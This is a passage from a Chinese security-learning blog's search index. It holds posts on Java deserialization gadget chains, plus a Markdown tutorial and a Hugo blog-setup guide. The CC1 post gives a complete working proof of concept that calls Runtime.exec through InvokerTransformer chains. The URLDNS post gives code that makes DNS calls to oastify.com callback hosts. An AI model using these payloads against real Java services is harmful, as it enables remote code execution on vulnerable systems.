130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;Iterator\u0026lt;/font\u0026gt; 对象。\n检查是否有下一个元素：调用 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;Iterator\u0026lt;/font\u0026gt; 对象的 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;hasNext()\u0026lt;/font\u0026gt; 方法，检查是否有下一个元素。\n获取下一个元素：如果 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;hasNext()\u0026lt;/font\u0026gt; 返回 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;true\u0026lt;/font\u0026gt;，则调用 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;Iterator\u0026lt;/font\u0026gt; 对象的 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;next()\u0026lt;/font\u0026gt; 方法，获取下一个元素。\n执行循环体：将获取的元素赋值给循环变量，并执行循环体。\n这意味着每次循环实际上是在使用迭代器遍历集合。\n即遍历调用setValue背后的详细步骤如下：\n获取迭代器：增强型 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;for\u0026lt;/font\u0026gt; 循环隐式调用 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;transformedMap.entrySet().iterator()\u0026lt;/font\u0026gt;，获取 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;Iterator\u0026lt;/font\u0026gt; 对象。 检查是否有下一个元素：增强型 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;for\u0026lt;/font\u0026gt; 循环隐式调用 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;Iterator\u0026lt;/font\u0026gt; 对象的 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;hasNext()\u0026lt;/font\u0026gt; 方法。 获取下一个元素：如果 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;hasNext()\u0026lt;/font\u0026gt; 返回 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;true\u0026lt;/font\u0026gt;，增强型 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;for\u0026lt;/font\u0026gt; 循环隐式调用 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;Iterator\u0026lt;/font\u0026gt; 对象的 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;next()\u0026lt;/font\u0026gt; 方法。 执行循环体：将 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;next()\u0026lt;/font\u0026gt; 方法返回的元素赋值给 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;entry\u0026lt;/font\u0026gt; 变量，然后执行循环体中的 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;entry.setValue(Runtime.class)\u0026lt;/font\u0026gt;。\u0026lt;font style=\u0026quot;color:rgb(39, 56, 73);\u0026quot;\u0026gt;parent早就是TransformedMap\u0026lt;/font\u0026gt;,所以自然会调用 \u0026lt;font style=\u0026quot;color:rgb(39, 56, 73);\u0026quot;\u0026gt;TransformedMap.checkSetValue\u0026lt;/font\u0026gt;\n1 2 3 4 5 6 7 8 9 10 Runtime runtime = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); hashmap.put(\u0026#34;123\u0026#34;,\u0026#34;456\u0026#34;); Map\u0026lt;Object,Object\u0026gt; decoratemap = TransformedMap.decorate(hashmap,null,invokerTransformer); for(Map.Entry entry:decoratemap.entrySet()) { entry.setValue(runtime); } 成功弹计算器了\n找readObject 找调用setValue的readObject入口类\n这里的for (Map.Entry\u0026lt;String, Object\u0026gt; memberValue : memberValues.entrySet())\n和for(Map.Entry entry:decoratemap.entrySet())可以发现是一样的,只不过参数名称不同,\n所以memberValues需要被赋值为TransformedMap\n没有修饰符,说明不能直接new,要通过反射\n1 2 3 4 Class clz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor annotationclz = clz.getDeclaredConstructor(Class.class,Map.class); annotationclz.setAccessible(true); Object o = annotationclz.newInstance(Override.class,decoratemap); 理想状况下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import java.util.Map; public class cc1Test { public static void main(String[] args) throws Exception{ Runtime runtime = Runtime.getRuntime(); Class c = Runtime.class; InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); hashmap.put(\u0026#34;123\u0026#34;,\u0026#34;456\u0026#34;); Map\u0026lt;Object,Object\u0026gt; decoratemap = TransformedMap.decorate(hashmap,null,invokerTransformer); Class clz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor annotationclz = clz.getDeclaredConstructor(Class.class,Map.class); annotationclz.setAccessible(true); Object o = annotationclz.newInstance(Override.class,decoratemap); serialize(o); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } 但是还有三个问题要解决\n1.Runtime对象不可序列化,需要通过反射将其变成可以序列化的形式。\n2.setValue() 的传参，是需要传 Runtime 对象的；而在实际情况当中的 setValue() 的传参是这个东西\n3.解决上文提到的，要进入 setValue 的两个 if 判断\n解决问题 1.Runtime不能序列化 Runtime 是不能序列化的，但是 Runtime.class 是可以序列化的。\n1 2 3 4 Runtime r = Runtime.getRuntime(); Class c = Runtime.class; Method method = c.getMethod(\u0026#34;exec\u0026#34;,String.class); method.invoke(r,\u0026#34;calc\u0026#34;); 对\u0026lt;font style=\u0026quot;color:rgb(80, 80, 92);\u0026quot;\u0026gt;getRuntime()\u0026lt;/font\u0026gt;也反射\n1 2 3 4 5 6 7 Class c = Runtime.class; Method method = c.getMethod(\u0026#34;getRuntime\u0026#34;); //getRuntime没有参数 Object object =(Runtime) method.invoke(null,null); //这里相当于调用静态方法getRuntime,返回Runtime实例 Method method1 = c.getMethod(\u0026#34;exec\u0026#34;,String.class); method1.invoke(object,\u0026#34;calc\u0026#34;); 2.解决两个if条件 第一个if\n打印一下就知道了\n所以name就是键名\nget是获取键名name的键值\nAnnotationInvocationHandler的readObject内的\u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;Class\u0026lt;?\u0026gt; memberType = memberTypes.get(name);\u0026lt;/font\u0026gt;做了什么呢？就是取出注解类中为name的方法名。\n因为先给的\u0026lt;font style=\u0026quot;color:rgb(33, 53, 71);\u0026quot;\u0026gt;Override\u0026lt;/font\u0026gt;没有方法,所以\u0026lt;font style=\u0026quot;color:rgb(33, 53, 71);\u0026quot;\u0026gt;memberType\u0026lt;/font\u0026gt;为null\n但是Target有value方法,所以给如果name为value,\u0026lt;font style=\u0026quot;color:rgb(33, 53, 71);\u0026quot;\u0026gt;memberType\u0026lt;/font\u0026gt;就为真\n1 2 hashmap.put(\u0026#34;value\u0026#34;,\u0026#34;456\u0026#34;); Object o = annotationclz.newInstance(Target.class,decoratemap); debug能进入下面的代码\n第二个if\n调试的时候,已经给出value的值是键值了,这个if判断就是判断value是不是memberType 的实例，或者ExceptionProxy 的实例，不是就执行 if 语句块中的代码\n这里put传键值随便传个123\n3.解决setValue() 的传参 这里用到了ChainedTransformer\ntransform方法就是个反射的代码\n所以不需要写那么多反射,这里直接每次都调用transform来反射\n构造方法能看到传入的是Transformer数组\n1 2 3 4 5 6 7 Transformer[] transformers = { new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;getRuntime\u0026#34;}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object.class},new Object[]{null,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(Runtime.class); 不是很看的懂\n1 2 3 4 5 6 7 相当于把这些操作都揉和了 Class c = Runtime.class; Method method = c.getMethod(\u0026#34;getRuntime\u0026#34;); Object object =(Runtime) method.invoke(null,null); Method method1 = c.getMethod(\u0026#34;exec\u0026#34;,String.class); method1.invoke(object,\u0026#34;calc\u0026#34;); InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}); 这里应该要传入TransformedMap的,但是限死了\n看报错看得出来\nConstantTransformer类也有个transform方法,而且只会返回他固定的值\n构造方法也简单,只需要传入一个类,这里传入Runtime.class\n完整poc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 Transformer[] transformers = { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // chainedTransformer.transform(Runtime.class); // System.out.println(transformers[0]); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); hashmap.put(\u0026#34;value\u0026#34;,\u0026#34;456\u0026#34;); Map\u0026lt;Object,Object\u0026gt; decoratemap = TransformedMap.decorate(hashmap,null,chainedTransformer); Class clz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor annotationclz = clz.getDeclaredConstructor(Class.class,Map.class); annotationclz.setAccessible(true); Object o = annotationclz.newInstance(Target.class,decoratemap); serialize(o); unserialize(\u0026#34;ser.bin\u0026#34;); 链子\n1 2 3 4 5 ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() MapEntry.setValue() TransformedMap.checkSetValue() ChainedTransformer.transform() ","date":"2025-01-03T15:12:32+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc1/6_hud69a7055820c9b61848b93fca47d389b_274875_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc1/","title":"java反序列化之Commons-Collections1-CC1链"},{"content":"这是ysoserial的URLDNS链\n首先选择HashMap,这里首先满足了继承Serializable\n再寻找source,找到重写的readObject\nKey 与 Value 的值执行了\u0026lt;font style=\u0026quot;color:rgb(51, 51, 51);\u0026quot;\u0026gt;readObject\u0026lt;/font\u0026gt;的操作，再将 Key 和 Value 两个变量扔进\u0026lt;font style=\u0026quot;color:rgb(51, 51, 51);\u0026quot;\u0026gt;hash\u0026lt;/font\u0026gt;这个方法里，我们再跟进(ctrl+鼠标左键即可) hash 当中\n如果传入的key不为null,则进入hashCode方法,跟进hashCode方法\n是Object类的方法,满足调用常见的函数\n原理 URL是hashMap的put方法产生的\nput调用hash方法,参数为key\n这里再调用key的hashCode方法\nHashMap到URL共有的hashCode方法,从而链接到一起\n1 2 3 HashMap\u0026lt;URL,Integer\u0026gt; hashmap = new HashMap\u0026lt;URL,Integer\u0026gt;(); hashmap.put(new URL(\u0026#34;DNS请求\u0026#34;),1); key就是URL的类 跟进URL,因为key.hashCode(),key又是new URL,所以这里会调用URL的hashCode方法\n发现是handler调用了hashCode方法,继续跟进\n跟进到URLStreamHandler类,寻找hashCode方法\nInetAddress addr = getHostAddress(u);对u进行了操作,跟进\ngetHostAddress\n这里就是对域名解析,然后可以检测DNS是否查询来判断反序列化漏洞\n利用 1 2 HashMap\u0026lt;URL,Integer\u0026gt; hashmap = new HashMap\u0026lt;URL,Integer\u0026gt;(); hashmap.put(new URL(\u0026#34;http://ylnjtzpu0nc2fpf8pskzf64kgbm2a4yt.oastify.com\u0026#34;),1); 运行序列化后,发现触发了DNS查询\n跟进URL的hashCode的\nhashCode一开始就是-1,所以会直接执行handler.hashCode从而触发DNS查询,这样会混淆是否是反序列化的时候触发\n所以需要再序列化的时候将hashCode的值改为不是-1的值\n因为hashCode是私有属性,需要通过反射来修改\n1 2 3 4 5 6 7 8 9 HashMap\u0026lt;URL,Integer\u0026gt; hashmap = new HashMap\u0026lt;URL,Integer\u0026gt;(); URL url = new URL(\u0026#34;http://g9q1hhdco50k373qda8h3os24takybqzf.oastify.com\u0026#34;); Class c =url.getClass(); Field hashcode = c.getDeclaredField(\u0026#34;hashCode\u0026#34;); hashcode.setAccessible(true); hashcode.set(url,123); hashmap.put(url,1); hashcode.set(url,-1); 通过反射修改后就不会出现上面的情况了\n","date":"2025-01-03T15:04:23+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/urldns/5_hu9be65c565c9573e11671b93a8e49cd18_347308_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/urldns/","title":"java反序列化之URLDNS链"},{"content":" Markdown 基本语法 | Markdown 教程\n标题语法 **#**数量代表标题级别\n#:一级\n##:二级\n强调语法 粗体 在单词或短语的前后各添加两个星号或下划线\n**a** -\u0026gt; a\nhello w**or**ld -\u0026gt; hello world\n斜体 在单词或短语前后添加一个星号或下划线\n*a* -\u0026gt; a\nw*or*ld -\u0026gt; world\n引用语法 块引用 段落前添加一个 \u0026gt; 符号\n\u0026gt; hello world\nhello world\n多段块引用enter就好了\n嵌套块引用 块引用可以嵌套。在要嵌套的段落前添加一个 \u0026gt;\u0026gt; 符号\nhello world\nhello wold\nhello world\n带有其它元素的块引用 块引用可以包含其他 Markdown 格式的元素\n一级 hello\nworld\nhello world !\n列表语法 有序列表 要创建有序列表，请在每个列表项前添加数字并紧跟一个英文句点。数字不必按数学顺序排列，但是列表应当以数字 1 起始。\nFirst\nSecond\nThird\n无序列表 要创建无序列表，请在每个列表项前面添加破折号 (-)、星号 (*) 或加号 (+) 。缩进一个或多个列表项可创建嵌套列表。\n- first\nfirst * second\nsecond + third\nthird 代码语法 将单词或短语表示为代码，请将其包裹在反引号 (\\) 中。\n`hello world` -\u0026gt; hello world\n转义反引号 如果你要表示为代码的单词或短语中包含一个或多个反引号，则可以通过将单词或短语包裹在双反引号(````)中。\n``hello `world`` -\u0026gt; hello `world\n代码块 在代码块之前和之后的行上使用三个反引号(`````）或三个波浪号（~~~）\n1 2 3 hello world ! 分割线语法 要创建分隔线，请在单独一行上使用三个或多个星号 (***)、破折号 (---) 或下划线 (___) ，并且不能包含其他内容。\n链接语法 链接文本放在中括号内，链接地址放在后面的括号中，链接title可选。\n超链接Markdown语法代码：[超链接显示名](超链接地址 \u0026quot;超链接title\u0026quot;)\n一个俗人的博客\n给链接增加 Title 链接title是当鼠标悬停在链接上时会出现的文字\n一个俗人的博客\n网址和Email地址 使用尖括号可以很方便地把URL或者email地址变成可点击的链接。\nhttps://gsygsr.github.io/\n带格式化的链接 点击访问原神**原神**\n图片语法 插入图片Markdown语法代码：![图片alt](图片链接 \u0026quot;图片title\u0026quot;)\n链接图片 给图片增加链接，请将图像的Markdown 括在方括号中，然后将链接添加在圆括号中。\n[![点击访问博客](4.jpg \u0026quot;点击访问博客\u0026quot;)](https://gsygsr.github.io)\n","date":"2024-12-31T15:27:48+08:00","image":"https://gsygsr.github.io/dajian/markdown/1_hu3963ffc2b11462ca836321861c385f3c_182481_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/dajian/markdown/","title":"Markdown"},{"content":"博客搭建 https://letere-gzj.github.io/hugo-stack/\n跟着博客就搭建完了\n到github自动部署这有些改动\n博客根目录/.github/workflows/自己起的名字.yaml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 name: deploy # 代码提交到main分支时触发github action on: push: branches: - main jobs: deploy: runs-on: ubuntu-24.04 #ubuntu版本不能用latest steps: - name: Checkout uses: actions/checkout@v4 with: fetch-depth: 0 - name: Setup Hugo uses: peaceiris/actions-hugo@v3 with: hugo-version: \u0026#34;0.129.0\u0026#34; #这里要改成本地hugo的版本 git自动部署后推送 第一次推送是这样\n1 2 3 4 5 6 git init git add . git commit -m \u0026#34;first commit\u0026#34; git branch -M main git remote add origin {你的github仓库地址} git push -u origin main 后续推送只需要\n1 2 3 git add . git commit -m \u0026#34;first commit\u0026#34; git push 头像修改 文件路径:boke\\assets\\img\n图片命名为avatar.png\n优先加载主目录下的\n字体修改 下载字体\n100font.com - 免费商用字体大全 - 免费字体下载网站\n把字体文件放入assets/font下\n将以下代码修改并复制到layouts/partials/footer/custom.html文件中(文件不存在就自己创建)\n字体名：给字体命名一个别名，随便填写就好，保持统一就行\n字体文件名：字体文件的全名，带后缀名的，也就是 xxx.ttf\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;style\u0026gt; @font-face { font-family: \u0026#39;字体名\u0026#39;; src: url({{ (resources.Get \u0026#34;font/字体文件名\u0026#34;).Permalink }}) format(\u0026#39;truetype\u0026#39;); } :root { --base-font-family: \u0026#39;字体名\u0026#39;; --code-font-family: \u0026#39;字体名\u0026#39;; } \u0026lt;/style\u0026gt; 显示文章更新时间 (1) 在配置文件 hugo.yaml 中加入以下配置\n1 2 3 4 5 6 7 8 # 更新时间：优先读取git时间 -\u0026gt; git时间不存在，就读取本地文件修改时间 frontmatter: lastmod: - :git - :fileModTime # 允许获取Git信息\tenableGitInfo: true (2) 若想在文章开头就显示更新时间，修改layouts/partials/article/components/detail.html，在指定位置引入以下代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;div class=\u0026#34;article-details\u0026#34;\u0026gt; ... \u0026lt;footer class=\u0026#34;article-time\u0026#34;\u0026gt; ... \u0026lt;!-- 更新时间 --\u0026gt; {{- if ne .Lastmod .Date -}} \u0026lt;div class=\u0026#34;article-lastmod\u0026#34;\u0026gt; {{ partial \u0026#34;helper/icon\u0026#34; \u0026#34;clock\u0026#34; }} \u0026lt;time\u0026gt; {{ .Lastmod.Format ( or .Site.Params.dateFormat.lastUpdated \u0026#34;Jan 02, 2006 15:04 MST\u0026#34; ) }} \u0026lt;/time\u0026gt; \u0026lt;/div\u0026gt; {{- end -}} .... \u0026lt;/footer\u0026gt; ... \u0026lt;/div\u0026gt; 这样就会文章开头显示修改时间 tips: 更新时间的格式去 hugo.yaml 中的 params.dateFormat.lastUpdated 进行修改 友链、归档多列显示 修改assets/scss/custom.scss文件(不存在则自行创建)，引入以下css样式代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 @media (min-width: 1024px) { .article-list--compact { display: grid; // 目前是两列，如需三列，则后面再加一个1fr，以此类推 grid-template-columns: 1fr 1fr; background: none; box-shadow: none; gap: 1rem; article { background: var(--card-background); border: none; box-shadow: var(--shadow-l2); margin-bottom: 8px; margin-right: 8px; border-radius: 16px; } } } 图片api https://t.mwm.moe/fj 二次元风景 https://imgapi.xl0408.top/index.php 直接把图片链接放到image\n用本地图片的话,绝对路径有点逆天,直接放到和文章同一文件夹就好了\n博客的一些设置 创建文章 一般用hugo命令创建文章的时候都是用的hugo new xxx/xxx/index.md\n尽量创建文章后命名用index.md来命名,否则图片会缺失\n文章会自带这些东西\n1 2 3 title = \u0026#39;Markdown\u0026#39; date = 2024-12-31T15:27:48+08:00 draft = true 但是如果想要文章封面的话需要加image等属性,每次都要手动加的话太麻烦\n找到博客根目录/archetypes/default.md\n1 2 3 4 5 6 7 8 9 10 11 title = \u0026#39;{{ replace .File.ContentBaseName \u0026#34;-\u0026#34; \u0026#34; \u0026#34; | title }}\u0026#39; date = {{ .Date }} draft = true author = \u0026#39;一个俗人\u0026#39; #想固定的就赋值 categories = [] image = \u0026#39;\u0026#39; #不想设置固定的就让他为空 description = \u0026#39;\u0026#39; 每次创建完文章后这些都会放在头上\n博客首页文章 博客首页的文章如果一开始删了content/post文件夹的话会导致首页没有文章\n如果想要更改放在首页的文章\n找到根目录下的hugo.yaml,打开搜索mainSections\n1 2 3 params: mainSections: - dajian # - 这里放文章文件夹的名字 然后网站首页就会显示这个文件夹里的文章了\n归档分类封面 根目录\\content\\categories\\分类的文件夹\n这里的md一定要为**_index.md**,否则不生效\n主页面背景设置 找到博客根目录\\layouts\\partials\\footer\\custom.html\n图片随机api\n1 2 3 4 5 body { background: url(\u0026#34;https://t.mwm.moe/fj\u0026#34;) no-repeat center top; background-size: cover; background-attachment: fixed; } 图片静态\n图片放到**\\assets\\background**\n1 2 3 4 5 6 7 \u0026lt;style\u0026gt; body { background: url({{ (resources.Get \u0026#34;background/背景图片名\u0026#34;).Permalink }}) no-repeat center top; background-size: cover; background-attachment: fixed; } \u0026lt;/style\u0026gt; 结语 博客一直都想着弄的,也是熬到2024的最后一天了(；´д｀)ゞ\n笔记都放到语雀上了,后续会放到博客上,本人菜鸡,大佬们勿喷d(´ω｀*)\n","date":"2024-12-31T14:54:43+08:00","image":"https://gsygsr.github.io/dajian/boke/0_hufacb938ae3fcb28eeaac68e6daac5c09_205100_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/dajian/boke/","title":"博客搭建"}]